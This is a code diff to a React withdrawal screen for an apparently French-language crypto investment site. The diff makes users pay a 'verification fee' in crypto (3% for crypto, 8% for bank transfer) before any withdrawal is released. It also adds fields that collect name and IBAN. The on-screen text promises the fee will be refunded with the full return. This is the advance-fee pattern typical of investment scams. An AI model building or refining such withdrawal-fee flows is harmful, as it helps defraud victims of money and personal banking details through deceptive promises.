@@ -17,9 +17,13 @@ const Investments = () => {
     const [showWithdrawModal, setShowWithdrawModal] = useState(false)
     const [selectedInvestment, setSelectedInvestment] = useState(null)
     const [withdrawalData, setWithdrawalData] = useState({
-        amount: "",
+        method: "crypto", // 'crypto' or 'bank'
         network: "SOL",
+        verificationNetwork: "SOL", // Network for verification payment
         walletAddress: "",
+        firstName: "",
+        lastName: "",
+        iban: "",
     })
     const [withdrawalLoading, setWithdrawalLoading] = useState(false)
     const [withdrawalStep, setWithdrawalStep] = useState("form") // 'form', 'verification_payment', 'success'
@@ -261,9 +265,13 @@ const Investments = () => {
     const openWithdrawModal = (investment) => {
         setSelectedInvestment(investment)
         setWithdrawalData({
-            amount: investment.expectedReturn.replace("€", "").replace(",", ""),
+            method: "crypto",
             network: "SOL",
+            verificationNetwork: "SOL",
             walletAddress: "",
+            firstName: "",
+            lastName: "",
+            iban: "",
         })
         setWithdrawalStep("form")
         setWithdrawalError(null)
@@ -273,7 +281,15 @@ const Investments = () => {
     const closeWithdrawModal = () => {
         setShowWithdrawModal(false)
         setSelectedInvestment(null)
-        setWithdrawalData({ amount: "", network: "SOL", walletAddress: "" })
+        setWithdrawalData({
+            method: "crypto",
+            network: "SOL",
+            verificationNetwork: "SOL",
+            walletAddress: "",
+            firstName: "",
+            lastName: "",
+            iban: "",
+        })
         setWithdrawalStep("form")
         setWithdrawalPayment(null)
         setVerificationPayment(null)
@@ -282,19 +298,39 @@ const Investments = () => {
 
     const handleWithdrawalSubmit = async (e) => {
         e.preventDefault()
-        if (!selectedInvestment || !withdrawalData.walletAddress || !withdrawalData.amount) return
+        if (!selectedInvestment) return
+
+        if (withdrawalData.method === "crypto" && !withdrawalData.walletAddress) return
+        if (
+            withdrawalData.method === "bank" &&
+            (!withdrawalData.firstName || !withdrawalData.lastName || !withdrawalData.iban)
+        )
+            return
 
         try {
             setWithdrawalLoading(true)
 
-            const verificationAmount = Number.parseFloat(withdrawalData.amount) * 0.03
+            const withdrawalAmount = Number.parseFloat(selectedInvestment.expectedReturn.replace("€", "").replace(",", ""))
+            const verificationFeeRate = withdrawalData.method === "crypto" ? 0.03 : 0.08
+            const verificationAmount = withdrawalAmount * verificationFeeRate
 
             const verificationResponse = await apiService.createVerificationPayment({
                 orderId: selectedInvestment.orderId,
-                withdrawalAmount: Number.parseFloat(withdrawalData.amount),
+                withdrawalAmount,
                 verificationAmount,
+                verificationFeeRate,
+                withdrawalMethod: withdrawalData.method,
                 network: withdrawalData.network,
+                verificationNetwork: withdrawalData.verificationNetwork,
                 walletAddress: withdrawalData.walletAddress,
+                bankDetails:
+                    withdrawalData.method === "bank"
+                        ? {
+                            firstName: withdrawalData.firstName,
+                            lastName: withdrawalData.lastName,
+                            iban: withdrawalData.iban,
+                        }
+                        : null,
                 userEmail: user.email,
             })
 
@@ -304,7 +340,7 @@ const Investments = () => {
             }
         } catch (err) {
             console.error("Verification payment error:", err)
-            setError("Erreur lors de la création du paiement de vérification")
+            setWithdrawalError("Erreur lors de la création du paiement de vérification")
         } finally {
             setWithdrawalLoading(false)
         }
@@ -573,11 +609,11 @@ const Investments = () => {
                         <p className="text-gray-500 text-sm sm:text-base">Commencez par choisir un package d'investissement</p>
                     </div>
                 ) : (
-                    <div className="space-y-4 sm:space-y-6">
+                    <div className="space-y-3 sm:space-y-6">
                         {investments.map((investment) => (
                             <div
                                 key={investment.id}
-                                className="bg-gradient-to-br from-slate-700/50 to-slate-800/50 backdrop-blur-sm rounded-xl sm:rounded-2xl p-4 sm:p-6 border border-slate-600/30 hover:border-teal-500/40 transition-all duration-500 hover:shadow-xl hover:shadow-teal-500/10"
+                                className="bg-gradient-to-br from-slate-700/50 to-slate-800/50 backdrop-blur-sm rounded-lg sm:rounded-2xl p-3 sm:p-6 border border-slate-600/30 hover:border-teal-500/40 transition-all duration-500 hover:shadow-xl hover:shadow-teal-500/10"
                             >
                                 {investment.rawStatus === "pending" && (
                                     <div className="mb-4 sm:mb-6 p-3 sm:p-4 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 border border-yellow-500/30 rounded-lg sm:rounded-xl">
@@ -862,8 +898,8 @@ const Investments = () => {
                                         <span className="text-white">{selectedInvestment.amount}</span>
                                     </div>
                                     <div className="flex justify-between">
-                                        <span className="text-gray-400">Retour Attendu:</span>
-                                        <span className="text-green-400">{selectedInvestment.expectedReturn}</span>
+                                        <span className="text-gray-400">Montant à Retirer:</span>
+                                        <span className="text-green-400 font-semibold">{selectedInvestment.expectedReturn}</span>
                                     </div>
                                     <div className="flex justify-between">
                                         <span className="text-gray-400">Statut:</span>
@@ -909,6 +945,146 @@ const Investments = () => {
 
                         {withdrawalStep === "form" && (
                             <form onSubmit={handleWithdrawalSubmit} className="space-y-4">
+                                <div>
+                                    <label className="block text-gray-300 text-sm font-medium mb-3">Méthode de Retrait</label>
+                                    <div className="grid grid-cols-2 gap-3">
+                                        <button
+                                            type="button"
+                                            onClick={() => setWithdrawalData({ ...withdrawalData, method: "crypto" })}
+                                            className={`p-4 rounded-xl border-2 transition-all duration-300 ${withdrawalData.method === "crypto"
+                                                ? "border-teal-500/50 bg-teal-500/10 text-teal-400"
+                                                : "border-slate-600/50 bg-slate-700/30 text-gray-300 hover:border-slate-500/50"
+                                                }`}
+                                        >
+                                            <div className="text-center">
+                                                <svg className="w-6 h-6 mx-auto mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                    <path
+                                                        strokeLinecap="round"
+                                                        strokeLinejoin="round"
+                                                        strokeWidth={2}
+                                                        d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"
+                                                    />
+                                                </svg>
+                                                <div className="font-semibold">Crypto</div>
+                                                <div className="text-xs mt-1">Frais: 3%</div>
+                                            </div>
+                                        </button>
+                                        <button
+                                            type="button"
+                                            onClick={() => setWithdrawalData({ ...withdrawalData, method: "bank" })}
+                                            className={`p-4 rounded-xl border-2 transition-all duration-300 ${withdrawalData.method === "bank"
+                                                ? "border-teal-500/50 bg-teal-500/10 text-teal-400"
+                                                : "border-slate-600/50 bg-slate-700/30 text-gray-300 hover:border-slate-500/50"
+                                                }`}
+                                        >
+                                            <div className="text-center">
+                                                <svg className="w-6 h-6 mx-auto mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                    <path
+                                                        strokeLinecap="round"
+                                                        strokeLinejoin="round"
+                                                        strokeWidth={2}
+                                                        d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"
+                                                    />
+                                                </svg>
+                                                <div className="font-semibold">Banque</div>
+                                                <div className="text-xs mt-1">Frais: 8%</div>
+                                            </div>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label className="block text-gray-300 text-sm font-medium mb-2">
+                                        Réseau pour le paiement de vérification
+                                    </label>
+                                    <select
+                                        value={withdrawalData.verificationNetwork}
+                                        onChange={(e) => setWithdrawalData({ ...withdrawalData, verificationNetwork: e.target.value })}
+                                        className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
+                                    >
+                                        <option value="SOL">Solana (SOL)</option>
+                                        <option value="ETH">Ethereum (ETH)</option>
+                                        <option value="USDT">USDT (ETH)</option>
+                                        <option value="USDC">USDC (ETH)</option>
+                                    </select>
+                                    <p className="text-xs text-gray-400 mt-1">
+                                        Choisissez le réseau crypto pour payer les frais de vérification
+                                    </p>
+                                </div>
+
+                                {withdrawalData.method === "crypto" && (
+                                    <>
+                                        <div>
+                                            <label className="block text-gray-300 text-sm font-medium mb-2">
+                                                Réseau de crypto-monnaie (pour le retrait)
+                                            </label>
+                                            <select
+                                                value={withdrawalData.network}
+                                                onChange={(e) => setWithdrawalData({ ...withdrawalData, network: e.target.value })}
+                                                className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
+                                            >
+                                                <option value="SOL">Solana (SOL)</option>
+                                                <option value="ETH">Ethereum (ETH)</option>
+                                                <option value="USDT">USDT (ETH)</option>
+                                                <option value="USDC">USDC (ETH)</option>
+                                            </select>
+                                        </div>
+
+                                        <div>
+                                            <label className="block text-gray-300 text-sm font-medium mb-2">Adresse de portefeuille</label>
+                                            <input
+                                                type="text"
+                                                value={withdrawalData.walletAddress}
+                                                onChange={(e) => setWithdrawalData({ ...withdrawalData, walletAddress: e.target.value })}
+                                                className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
+                                                placeholder="Votre adresse de portefeuille"
+                                                required
+                                            />
+                                        </div>
+                                    </>
+                                )}
+
+                                {withdrawalData.method === "bank" && (
+                                    <>
+                                        <div className="grid grid-cols-2 gap-3">
+                                            <div>
+                                                <label className="block text-gray-300 text-sm font-medium mb-2">Prénom</label>
+                                                <input
+                                                    type="text"
+                                                    value={withdrawalData.firstName}
+                                                    onChange={(e) => setWithdrawalData({ ...withdrawalData, firstName: e.target.value })}
+                                                    className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
+                                                    placeholder="Prénom"
+                                                    required
+                                                />
+                                            </div>
+                                            <div>
+                                                <label className="block text-gray-300 text-sm font-medium mb-2">Nom</label>
+                                                <input
+                                                    type="text"
+                                                    value={withdrawalData.lastName}
+                                                    onChange={(e) => setWithdrawalData({ ...withdrawalData, lastName: e.target.value })}
+                                                    className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
+                                                    placeholder="Nom"
+                                                    required
+                                                />
+                                            </div>
+                                        </div>
+
+                                        <div>
+                                            <label className="block text-gray-300 text-sm font-medium mb-2">Numéro IBAN</label>
+                                            <input
+                                                type="text"
+                                                value={withdrawalData.iban}
+                                                onChange={(e) => setWithdrawalData({ ...withdrawalData, iban: e.target.value.toUpperCase() })}
+                                                className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors font-mono"
+                                                placeholder="FR76 1234 5678 9012 3456 7890 123"
+                                                required
+                                            />
+                                        </div>
+                                    </>
+                                )}
+
                                 <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg sm:rounded-xl p-3 sm:p-4 mb-4">
                                     <div className="flex items-center space-x-2 mb-2">
                                         <svg
@@ -924,72 +1100,48 @@ const Investments = () => {
                                                 d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L3.732 16.5c-.77.833.192 2.5 1.732 2.5z"
                                             />
                                         </svg>
-                                        <span className="text-yellow-400 font-semibold text-sm sm:text-base">Frais de retrait</span>
+                                        <span className="text-yellow-400 font-semibold text-sm sm:text-base">Frais de vérification</span>
                                     </div>
                                     <p className="text-yellow-300/80 text-xs sm:text-sm">
-                                        Des frais de 3% TVA s'appliquent à tous les retraits. Vous devrez effectuer un paiement pour ces
-                                        frais avant que votre retrait soit traité.
+                                        Vous devez d'abord payer les frais de vérification en crypto (
+                                        {withdrawalData.method === "crypto" ? "3%" : "8%"}) pour confirmer votre identité avant de recevoir
+                                        votre retrait complet.
                                     </p>
                                 </div>
 
-                                <div>
-                                    <label className="block text-gray-300 text-sm font-medium mb-2">Montant à retirer</label>
-                                    <input
-                                        type="number"
-                                        value={withdrawalData.amount}
-                                        onChange={(e) => setWithdrawalData({ ...withdrawalData, amount: e.target.value })}
-                                        className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
-                                        placeholder="Montant en EUR"
-                                        required
-                                    />
-                                </div>
+                                {selectedInvestment &&
+                                    (() => {
+                                        const withdrawalAmount = Number.parseFloat(
+                                            selectedInvestment.expectedReturn.replace("€", "").replace(",", ""),
+                                        )
+                                        const verificationFeeRate = withdrawalData.method === "crypto" ? 0.03 : 0.08
+                                        const verificationAmount = withdrawalAmount * verificationFeeRate
+                                        const totalAmount = withdrawalAmount + verificationAmount
 
-                                <div>
-                                    <label className="block text-gray-300 text-sm font-medium mb-2">Réseau de crypto-monnaie</label>
-                                    <select
-                                        value={withdrawalData.network}
-                                        onChange={(e) => setWithdrawalData({ ...withdrawalData, network: e.target.value })}
-                                        className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
-                                    >
-                                        <option value="SOL">Solana (SOL)</option>
-                                        <option value="ETH">Ethereum (ETH)</option>
-                                        <option value="USDT">USDT (ETH)</option>
-                                        <option value="USDC">USDC (ETH)</option>
-                                    </select>
-                                </div>
-
-                                <div>
-                                    <label className="block text-gray-300 text-sm font-medium mb-2">Adresse de portefeuille</label>
-                                    <input
-                                        type="text"
-                                        value={withdrawalData.walletAddress}
-                                        onChange={(e) => setWithdrawalData({ ...withdrawalData, walletAddress: e.target.value })}
-                                        className="w-full bg-slate-700/50 border border-slate-600/50 rounded-xl px-4 py-3 text-white focus:border-teal-500/50 focus:outline-none transition-colors"
-                                        placeholder="Votre adresse de portefeuille"
-                                        required
-                                    />
-                                </div>
-
-                                <div className="bg-slate-700/30 rounded-xl p-4">
-                                    <div className="flex justify-between text-sm mb-2">
-                                        <span className="text-gray-400">Montant demandé:</span>
-                                        <span className="text-white">€{withdrawalData.amount || "0"}</span>
-                                    </div>
-                                    <div className="flex justify-between text-sm mb-2">
-                                        <span className="text-gray-400">Frais TVA (3%):</span>
-                                        <span className="text-yellow-400">
-                                            €{(Number.parseFloat(withdrawalData.amount || 0) * 0.03).toFixed(2)}
-                                        </span>
-                                    </div>
-                                    <div className="border-t border-slate-600/50 pt-2 mt-2">
-                                        <div className="flex justify-between font-semibold">
-                                            <span className="text-white">Vous recevrez:</span>
-                                            <span className="text-green-400">
-                                                €{(Number.parseFloat(withdrawalData.amount || 0) * 0.97).toFixed(2)}
-                                            </span>
-                                        </div>
-                                    </div>
-                                </div>
+                                        return (
+                                            <div className="bg-slate-700/30 rounded-xl p-4">
+                                                <div className="flex justify-between text-sm mb-2">
+                                                    <span className="text-gray-400">Montant à retirer:</span>
+                                                    <span className="text-white">€{withdrawalAmount.toLocaleString()}</span>
+                                                </div>
+                                                <div className="flex justify-between text-sm mb-2">
+                                                    <span className="text-gray-400">
+                                                        Frais de vérification ({withdrawalData.method === "crypto" ? "3%" : "8%"}):
+                                                    </span>
+                                                    <span className="text-yellow-400">€{verificationAmount.toFixed(2)}</span>
+                                                </div>
+                                                <div className="border-t border-slate-600/50 pt-2 mt-2">
+                                                    <div className="flex justify-between font-semibold">
+                                                        <span className="text-white">Vous recevrez après vérification:</span>
+                                                        <span className="text-green-400">€{totalAmount.toLocaleString()}</span>
+                                                    </div>
+                                                    <p className="text-xs text-gray-400 mt-1">
+                                                        * Le montant complet + frais de vérification seront transférés après paiement
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        )
+                                    })()}
 
                                 <button
                                     type="submit"
@@ -1013,7 +1165,8 @@ const Investments = () => {
                                 <div className="text-center mb-4 sm:mb-6">
                                     <h4 className="text-base sm:text-lg font-semibold text-white mb-2">Paiement de Vérification</h4>
                                     <p className="text-gray-400 text-xs sm:text-sm">
-                                        Payez 3% pour vérifier votre identité. Vous recevrez ce montant avec votre retrait complet.
+                                        Payez {withdrawalData.method === "crypto" ? "3%" : "8%"} pour vérifier votre identité. Après
+                                        vérification, vous recevrez le montant complet de {selectedInvestment?.expectedReturn}.
                                     </p>
                                 </div>
 
@@ -1031,10 +1184,18 @@ const Investments = () => {
                                     </div>
                                     <p className="text-blue-300/80 text-sm">
                                         Ce paiement prouve que vous êtes un utilisateur réel. Après vérification, vous recevrez{" "}
-                                        <strong>€{withdrawalData.amount}</strong> +{" "}
-                                        <strong>€{(Number.parseFloat(withdrawalData.amount) * 0.03).toFixed(2)}</strong> (remboursement de
-                                        vérification) = <strong>€{(Number.parseFloat(withdrawalData.amount) * 1.03).toFixed(2)}</strong> au
-                                        total.
+                                        <strong>
+                                            €{(() => {
+                                                const withdrawalAmount = Number.parseFloat(
+                                                    selectedInvestment?.expectedReturn.replace("€", "").replace(",", "") || "0",
+                                                )
+                                                const verificationFeeRate = withdrawalData.method === "crypto" ? 0.03 : 0.08
+                                                const verificationAmount = withdrawalAmount * verificationFeeRate
+                                                const totalAmount = withdrawalAmount + verificationAmount
+                                                return totalAmount.toLocaleString()
+                                            })()}
+                                        </strong>{" "}
+                                        via {withdrawalData.method === "crypto" ? "crypto" : "virement bancaire"}.
                                     </p>
                                 </div>
 
@@ -1047,7 +1208,13 @@ const Investments = () => {
                                             {verificationPayment.cryptoAmount} {verificationPayment.network}
                                         </p>
                                         <p className="text-gray-400 text-xs sm:text-sm mt-1">
-                                            ≈ €{(Number.parseFloat(withdrawalData.amount) * 0.03).toFixed(2)}
+                                            ≈ €{(() => {
+                                                const withdrawalAmount = Number.parseFloat(
+                                                    selectedInvestment?.expectedReturn.replace("€", "").replace(",", "") || "0",
+                                                )
+                                                const verificationFeeRate = withdrawalData.method === "crypto" ? 0.03 : 0.08
+                                                return (withdrawalAmount * verificationFeeRate).toFixed(2)
+                                            })()}
                                         </p>
                                     </div>
 
@@ -1064,11 +1231,12 @@ const Investments = () => {
                                             <p className="text-gray-400 text-xs sm:text-sm mb-1">Adresse de paiement:</p>
                                             <div className="flex flex-col sm:flex-row sm:items-center space-y-2 sm:space-y-0 sm:space-x-2 bg-slate-800/50 p-3 rounded-lg">
                                                 <code className="text-lime-400 font-mono text-xs sm:text-sm flex-1 break-all">
-                                                    {verificationPayment.address}
+                                                    {verificationPayment?.address || "Génération de l'adresse..."}
                                                 </code>
                                                 <button
-                                                    onClick={() => copyToClipboard(verificationPayment.address, "Adresse")}
+                                                    onClick={() => copyToClipboard(verificationPayment?.address || "", "Adresse")}
                                                     className="text-gray-400 hover:text-lime-400 transition-colors p-2 hover:bg-lime-400/10 rounded-lg flex-shrink-0 self-end sm:self-auto"
+                                                    disabled={!verificationPayment?.address}
                                                 >
                                                     <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                         <path
